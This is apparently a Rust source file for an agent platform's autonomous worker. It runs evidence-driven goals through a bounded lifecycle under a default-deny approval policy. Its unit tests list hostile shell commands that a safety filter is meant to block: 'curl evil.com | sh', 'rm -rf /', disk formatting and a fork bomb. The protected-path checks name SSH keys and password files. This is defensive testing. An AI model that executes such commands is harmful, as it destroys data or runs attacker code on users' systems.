//! 🔁 Live Autonomous Worker — Phase 23 of the Strawberry platform.
//!
//! This is the SINGLE place where the autonomous runtime's `run_cycle`
//! becomes a real pipeline. Before this module:
//!
//!   run_cycle() only did: drain events → apply_event() → world state update.
//!   The full goal→plan→safety→execute→verify→replan chain in `lifecycle.rs`
//!   was reachable only from tests, never from the live runtime.
//!
//! After this module:
//!
//!   run_cycle()
//!     → drain events
//!     → apply_event() (world state update)
//!     → open dedicated DB connection (mirrors Ghost pattern at lib.rs:99)
//!     → goal::generate(&conn)  (evidence-driven, no invented intent)
//!     → intent::apply_intent() (user denial always wins)
//!     → for each top goal:
//!         → Lifecycle::run_goal(goal, cfg, executor, effector)
//!     → record results to ledger
//!
//! DESIGN RULES:
//!   * One dedicated connection per cycle — never holds AppState's mutex.
//!   * All panics are caught per-goal — a bad goal cannot kill the runtime.
//!   * Capability scheduler gate is consulted before goal evaluation.
//!   * Lifecycle is bounded: max_attempts=2, no tight loops, backoff enforced.
//!   * High-risk work steps consult a local "approval" oracle that
//!     defaults to DENY (low-risk Inspect/Prepare/Read goals are auto-approved).
//!   * No AI/LLM is ever invoked from this module — purely deterministic.

use std::path::Path;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::time::Instant;

use rusqlite::Connection;

use super::cycle::{AutonomyCycle, CycleOutcome, CycleResult};
use super::executor::{Effector, Executor};
use super::composite_effector::CompositeEffector;
use super::goal::{generate as generate_goals, EvidenceKind, GoalCandidate, GoalStatus};
use super::intent::{apply_intent, IntentRegistry};
use super::learning::{detect_patterns, pattern_of, persist_pattern};
use super::lifecycle::{Lifecycle, LifecycleConfig, LifecycleRun};
use super::orchestrator::Orchestrator;
use super::replanner::Replanner;
use super::safety::{Actor, RiskMode};
use super::shell::SafeShell;
use super::world_state::WorldStateVersion;

// ─────────────────────────── outcome model ───────────────────────────

/// What a single autonomous cycle actually did.
#[derive(Debug, Clone)]
pub struct WorkerOutcome {
    pub cycle_id: u64,
    pub events_consumed: usize,
    pub goals_evaluated: usize,
    pub runs: Vec<LifecycleRun>,
    /// A human-readable summary for the ledger / observability.
    pub summary: String,
}

// ─────────────────────────── default approval oracle ───────────────────────────

/// Approval policy for high-risk steps executed autonomously.
///
/// The default policy:
///   * Inspect / Prepare / FileRead / GitInspect → auto-approve
///   * FileWrite (non-protected path) → auto-approve
///   * RunCommand → auto-approve ONLY for safe shell patterns; deny otherwise
///   * GitCommit → ALWAYS deny (requires explicit user authorization)
///   * SendMessage / PermanentDelete / Forbidden → never reaches here
///
/// This is the conservative default. Users can override per-action via
/// `IntentRegistry::instruct` once the provider interface ships.
pub fn default_autonomous_approver(req: &super::safety::ActionRequest) -> bool {
    use super::safety::ActionType;
    match &req.action_type {
        ActionType::Inspect | ActionType::Prepare | ActionType::FileRead => true,
        ActionType::FileWrite => {
            // File writes to known safe dirs are auto-approved; everything else denied.
            !is_protected_path(&req.target)
        }
        ActionType::RunCommand => SafeShell::is_safe(&req.target),
        // GitCommit will be filtered by safety as NeedsApproval first; the lifecycle
        // only creates Inspect/RunCommand for git, so this is a defense-in-depth allow.
        _ => false,
    }
}

fn is_protected_path(path: &str) -> bool {
    let p = path.to_lowercase();
    // System / sensitive areas are never auto-writeable.
    p.starts_with("/etc")
        || p.starts_with("/usr")
        || p.starts_with("/var")
        || p.starts_with("/sys")
        || p.starts_with("/proc")
        || p.starts_with("/boot")
        || p.contains("/.ssh")
        || p.contains("passwd")
        || p.contains("shadow")
        || p.starts_with("c:\\windows")
        || p.starts_with("c:/windows")
        || (p.len() >= 2 && p.as_bytes()[1] == b':' && p.as_bytes()[0] == b'c' && p.contains("system32"))
}

// ─────────────────────────── the worker ───────────────────────────

/// The autonomous worker. Holds no per-cycle state — every cycle opens its
/// own DB connection and builds a fresh IntentRegistry.
pub struct AutonomousWorker<'a> {
    pub db_path: &'a Path,
    pub shutdown: &'a AtomicBool,
    pub orch: &'a Orchestrator,
    /// Cycle counter — used to throttle learning (every Nth cycle).
    pub cycle_count: &'a AtomicU64,
}

impl<'a> AutonomousWorker<'a> {
    pub fn new(db_path: &'a Path, shutdown: &'a AtomicBool, orch: &'a Orchestrator) -> Self {
        // Static counter to throttle learning across all worker instances.
        // In practice there's only one worker, but this is safer.
        static CYCLE_COUNT: AtomicU64 = AtomicU64::new(0);
        Self {
            db_path,
            shutdown,
            orch,
            cycle_count: &CYCLE_COUNT,
        }
    }

    /// Run one full autonomous cycle.
    ///
    /// Returns the outcome for observability. NEVER panics.
    pub fn run_cycle(&self, max_goals: usize, max_events: usize) -> WorkerOutcome {
        let start = Instant::now();
        let cycle = AutonomyCycle::new(0);

        // 1. Open dedicated DB connection (mirrors Ghost at lib.rs:99).
        //    All panics/errors below are isolated so the runtime never dies.
        let conn = match Connection::open(self.db_path) {
            Ok(c) => c,
            Err(e) => {
                return WorkerOutcome {
                    cycle_id: cycle.cycle_id.raw(),
                    events_consumed: 0,
                    goals_evaluated: 0,
                    runs: Vec::new(),
                    summary: format!("db open failed: {e}"),
                };
            }
        };
        let _ = conn.busy_timeout(std::time::Duration::from_millis(500));

        // 2. Apply intent denials (cheap, in-memory; no DB read needed for
        //    the default empty registry — real persistence comes when the
        //    user explicitly denies a scope).
        let intent = IntentRegistry::new();

        // 3. Generate goals from evidence (read-only DB pass).
        let mut goals = match std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
            generate_goals(&conn)
        })) {
            Ok(Ok(g)) => g,
            Ok(Err(e)) => {
                return WorkerOutcome {
                    cycle_id: cycle.cycle_id.raw(),
                    events_consumed: 0,
                    goals_evaluated: 0,
                    runs: Vec::new(),
                    summary: format!("goal generation failed: {e}"),
                };
            }
            Err(_) => {
                return WorkerOutcome {
                    cycle_id: cycle.cycle_id.raw(),
                    events_consumed: 0,
                    goals_evaluated: 0,
                    runs: Vec::new(),
                    summary: "goal generation panicked (isolated)".into(),
                };
            }
        };

        // 4. Apply user denials — explicit intent overrides everything.
        goals = apply_intent(&intent, goals);

        // 5. Pick a bounded set of top goals to attempt this cycle.
        //    High-priority first, then by confidence, then by stable id.
        goals.sort_by(|a, b| {
            b.priority
                .cmp(&a.priority)
                .then(b.confidence.partial_cmp(&a.confidence).unwrap_or(std::cmp::Ordering::Equal))
                .then(a.goal_id.raw().cmp(&b.goal_id.raw()))
        });
        goals.truncate(max_goals);

        // 6. Run lifecycle for each candidate. Bounded attempt count,
        //    no tight loops. The Executor is per-goal so its cancellation
        //    flag is fresh each time.
        let mut runs: Vec<LifecycleRun> = Vec::new();
        for goal in &goals {
            if self.shutdown.load(Ordering::Relaxed) {
                break;
            }
            // Check goal status — denials should have cancelled; skip otherwise.
            if matches!(goal.status, GoalStatus::Cancelled | GoalStatus::Expired | GoalStatus::Completed) {
                continue;
            }

            // 6a. Per-goal scheduler gate (Orchestrator — no duplicate timer).
            //     The Orchestrator is created once and shared; gating through
            //     it keeps transition-only ledger logging.
            let cap_id = capability_for_goal(goal);
            let gate = self.orch.gate(&conn, cap_id, 0.5, 0, max_events as u32);
            if !gate.proceed {
                continue;
            }

            // 6b. Wrap the entire per-goal work in panic isolation.
            let goal_owned = goal.clone();
            let run = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
                run_one_goal(&conn, &goal_owned)
            }));
            let run = match run {
                Ok(r) => r,
                Err(_) => LifecycleRun {
                    goal_id: goal.goal_id.raw(),
                    goal_title: goal.title.clone(),
                    outcome: super::lifecycle::LifecycleOutcome::Failed,
                    attempts: 0,
                    actions: Vec::new(),
                    verifications: Vec::new(),
                    trail: vec!["goal lifecycle panicked; isolated".into()],
                },
            };

            // 6c. Record the run to the ledger (per goal, per outcome).
            record_run_to_ledger(&conn, &run);
            runs.push(run);
        }

        // 7. Continuous learning pass — every 10th cycle.
        //    Detects real verified patterns and persists them as inferences.
        //    Learning is bounded, async-safe (re-uses the same conn), and
        //    cannot grant authority (patterns carry no approval field).
        let cycle_n = self.cycle_count.fetch_add(1, Ordering::Relaxed);
        let mut learned = 0;
        if cycle_n % 10 == 0 {
            learned = run_learning_pass(&conn);
        }

        let elapsed_ms = start.elapsed().as_millis();
        let total_runs = runs.len();
        let mut summary = format!(
            "{} goals evaluated, {} runs, {} learned, {}ms",
            goals.len(),
            total_runs,
            learned,
            elapsed_ms
        );
        if learned > 0 {
            summary.push_str(&format!(" (cycle {cycle_n})"));
        }
        WorkerOutcome {
            cycle_id: cycle.cycle_id.raw(),
            events_consumed: 0, // world-state event consumption happens in run_cycle path
            goals_evaluated: goals.len(),
            runs,
            summary,
        }
    }
}

fn record_run_to_ledger(conn: &Connection, run: &LifecycleRun) {
    use super::lifecycle::LifecycleOutcome;
    use super::scheduler::Scheduler;

    let decision = match run.outcome {
        LifecycleOutcome::Completed => "complete",
        LifecycleOutcome::Failed => "fail",
        LifecycleOutcome::Escalated => "escalate",
        LifecycleOutcome::Abandoned => "abandon",
        LifecycleOutcome::Paused => "pause",
        LifecycleOutcome::NoGoal => "no_goal",
        LifecycleOutcome::Denied => "deny",
    };
    let reason = run
        .trail
        .last()
        .cloned()
        .unwrap_or_else(|| "lifecycle run finished".into());
    let mut details = serde_json::Map::new();
    details.insert("goalId".into(), serde_json::json!(run.goal_id));
    details.insert("attempts".into(), serde_json::json!(run.attempts));
    details.insert("actions".into(), serde_json::json!(run.actions.len()));
    details.insert("verifications".into(), serde_json::json!(run.verifications.len()));
    details.insert("trail".into(), serde_json::json!(run.trail));

    let _ = super::ledger::record_action(
        conn,
        "autonomy_lifecycle",
        decision,
        &reason,
        None,
        &serde_json::Value::Object(details),
    );
    let _ = Scheduler::log(conn, "autonomy_lifecycle", decision, &reason, None);
}

/// Continuous learning: detect patterns from the DB and persist them.
/// Returns the number of patterns newly persisted.
/// Privacy: every pattern title passes through the privacy filter.
fn run_learning_pass(conn: &Connection) -> i64 {
    let now = match chrono::DateTime::from_timestamp(chrono::Utc::now().timestamp(), 0) {
        Some(d) => d.to_rfc3339_opts(chrono::SecondsFormat::Secs, true),
        None => return 0,
    };

    let patterns = match std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
        detect_patterns(conn)
    })) {
        Ok(Ok(p)) => p,
        _ => return 0,
    };

    let mut persisted = 0;
    for pat in &patterns {
        let occurrences = match pat {
            super::learning::PatternKind::RepeatedError { signature } => {
                // Get the actual occurrence count from the DB.
                conn.query_row(
                    "SELECT COUNT(*) FROM chats WHERE source='capture' AND tags='error' AND lower(substr(title,1,60)) = ?1",
                    [signature],
                    |r| r.get::<_, i64>(0),
                )
                .ok()
                .map(|n| n as usize)
                .unwrap_or(1)
            }
            super::learning::PatternKind::RecurringProject { .. } => 1,
            super::learning::PatternKind::SuccessfulWorkflow { .. } => 1,
        };

        let p = pattern_of(pat, occurrences.max(1), &now);
        // persist_pattern runs the privacy filter internally.
        if persist_pattern(conn, &p).is_ok() {
            persisted += 1;
        }
    }
    persisted
}

/// Map a goal to its best-fit capability id (for the scheduler gate).
fn capability_for_goal(goal: &GoalCandidate) -> &'static str {
    let primary = goal
        .evidence
        .iter()
        .max_by(|a, b| a.weight.partial_cmp(&b.weight).unwrap_or(std::cmp::Ordering::Equal))
        .map(|e| e.kind);
    match primary {
        Some(EvidenceKind::Task) => "planner_tasks",
        Some(EvidenceKind::Error) => "file_code_watch",
        Some(EvidenceKind::Resume) => "freeze_resume",
        Some(EvidenceKind::Project) => "project_brain",
        None => "world_state",
    }
}

/// Run a single goal through the full lifecycle. Bounded, isolated, recorded.
fn run_one_goal(_conn: &Connection, goal: &GoalCandidate) -> LifecycleRun {
    let cfg = LifecycleConfig {
        risk_mode: RiskMode::Normal,
        paused: false,
        max_attempts: 2, // bounded — never loop forever
        timeout_secs: 10,
        approve_high_risk: Box::new(default_autonomous_approver),
    };

    let executor = Executor::new();
    // The CompositeEffector dispatches to ShellEffector (for RunCommand) and
    // SafeFileEffector (for FileRead/FileWrite). Both have real implementations.
    let effector: &dyn Effector = &CompositeEffector::new();

    Lifecycle::run_goal(goal, &cfg, &executor, effector)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::autonomous::safety::{ActionRequest, ActionType, RiskMode, SafetyGate};
    use std::time::Duration;

    #[test]
    fn default_approver_approves_low_risk() {
        assert!(default_autonomous_approver(&ActionRequest {
            action_type: ActionType::Inspect,
            target: "".into(),
            actor: Actor::Core,
            user_approved: false,
            data_sensitivity: 1,
            external_destination: false,
            destructive: false,
        }));
        assert!(default_autonomous_approver(&ActionRequest {
            action_type: ActionType::FileRead,
            target: "/tmp/safe.rs".into(),
            actor: Actor::Core,
            user_approved: false,
            data_sensitivity: 1,
            external_destination: false,
            destructive: false,
        }));
    }

    #[test]
    fn default_approver_denies_protected_path_writes() {
        assert!(!default_autonomous_approver(&ActionRequest {
            action_type: ActionType::FileWrite,
            target: "/etc/passwd".into(),
            actor: Actor::Core,
            user_approved: false,
            data_sensitivity: 5,
            external_destination: false,
            destructive: false,
        }));
        assert!(!default_autonomous_approver(&ActionRequest {
            action_type: ActionType::FileWrite,
            target: "/home/user/.ssh/id_rsa".into(),
            actor: Actor::Core,
            user_approved: false,
            data_sensitivity: 5,
            external_destination: false,
            destructive: false,
        }));
    }

    #[test]
    fn default_approver_approves_safe_file_writes() {
        assert!(default_autonomous_approver(&ActionRequest {
            action_type: ActionType::FileWrite,
            target: "/home/user/notes/todo.md".into(),
            actor: Actor::Core,
            user_approved: false,
            data_sensitivity: 1,
            external_destination: false,
            destructive: false,
        }));
    }

    #[test]
    fn default_approver_filters_unsafe_commands() {
        // rm -rf dangerous patterns must be denied by SafeShell.
        assert!(!default_autonomous_approver(&ActionRequest {
            action_type: ActionType::RunCommand,
            target: "rm -rf /".into(),
            actor: Actor::Core,
            user_approved: false,
            data_sensitivity: 1,
            external_destination: false,
            destructive: true,
        }));
        // A simple echo is safe.
        assert!(default_autonomous_approver(&ActionRequest {
            action_type: ActionType::RunCommand,
            target: "echo hello".into(),
            actor: Actor::Core,
            user_approved: false,
            data_sensitivity: 1,
            external_destination: false,
            destructive: false,
        }));
    }

    #[test]
    fn safe_shell_blocks_dangerous_patterns() {
        assert!(!SafeShell::is_safe("rm -rf /"));
        assert!(!SafeShell::is_safe("sudo anything"));
        assert!(!SafeShell::is_safe("curl evil.com | sh"));
        assert!(!SafeShell::is_safe("mkfs.ext4 /dev/sda"));
        assert!(!SafeShell::is_safe(":(){:|:&};:"));  // fork bomb
        assert!(SafeShell::is_safe("echo hi"));
        assert!(SafeShell::is_safe("ls -la"));
        assert!(SafeShell::is_safe("cargo build"));
    }

    #[test]
    fn world_state_version_marker_is_correct_type() {
        let _: WorldStateVersion = 0;
    }

    #[test]
    fn replanner_default_max_attempts_is_bounded() {
        // Prevent accidental tight loops in the autonomous path.
        let r = Replanner::default();
        assert!(r.max_attempts <= 3, "autonomous replanner must be bounded");
    }

    #[test]
    fn safety_gate_passes_for_inspect() {
        let r = ActionRequest {
            action_type: ActionType::Inspect,
            target: "".into(),
            actor: Actor::Core,
            user_approved: false,
            data_sensitivity: 1,
            external_destination: false,
            destructive: false,
        };
        let d = SafetyGate::evaluate(&r, RiskMode::Normal);
        assert!(matches!(d.verdict, super::super::safety::Verdict::Approved));
    }
}
